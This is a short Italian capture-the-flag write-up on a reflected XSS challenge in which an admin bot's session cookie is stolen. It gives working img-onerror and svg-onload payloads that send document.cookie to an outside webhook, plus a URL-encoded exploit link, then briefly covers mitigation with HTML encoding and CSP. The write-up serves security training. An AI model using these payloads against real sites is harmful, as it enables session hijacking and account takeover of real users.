# Reflected XSS (Session Hijacking)

### 1. La Vulnerabilità (In sintesi)
Il server riflette l'input utente (dal parametro `html`) direttamente nella pagina di risposta senza encoding o sanitizzazione.
La sfida richiede di rubare il cookie di sessione di un "admin bot", passandogli un URL malevolo tramite una funzione "report".

### 2. Exploitation (Pratica)

**Soluzione Principale (`img onerror`):**
Invece del bloccabile tag `<script>`, si innesca l'esecuzione JS simulando il caricamento fallito di un'immagine inesistente, esfiltrando il cookie al webhook tramite `fetch`:
```html
<img src="x" onerror="fetch('https://webhook.site/YOUR-WEBHOOK-ID?cookie='+document.cookie)">
```

**Soluzione Secondaria (`svg onload`):**
Per innescare il JS non appena l'elemento viene renderizzato con successo (bypassando ulteriori filtri sulle immagini):
```html
<svg onload="fetch('https://webhook.site/YOUR-WEBHOOK-ID?cookie='+document.cookie)"></svg>
```

**Step di Esecuzione (Cruciale):**
L'URL inviato al bot **DEVE essere URL-Encodato** affinché i parametri dell'XSS (come `?` o `&` nel payload) non frammentino l'indirizzo originale nel form di segnalazione.
L'URL da sottomettere nel modulo di "report" sarà:
```text
http://xss1.challs.cyberchallenge.it/?html=%3Cimg+src%3D%22x%22+onerror%3D%22fetch%28%27https%3A%2F%2Fwebhook.site%2FYOUR-WEBHOOK-ID%3Fcookie%3D%27%2Bdocument.cookie%29%22%3E
```
L'admin (bot) cliccherà, eseguirà l'XSS a schermo e invierà il suo cookie verso il webhook designato.

### 3. Mitigazione
Utilizzare sempre HTML-encoding (`htmlspecialchars` in PHP) per la formattazione dell'input non sicuro prima di inviarlo al DOM. Utilizzare una rigorosa Content Security Policy (CSP).
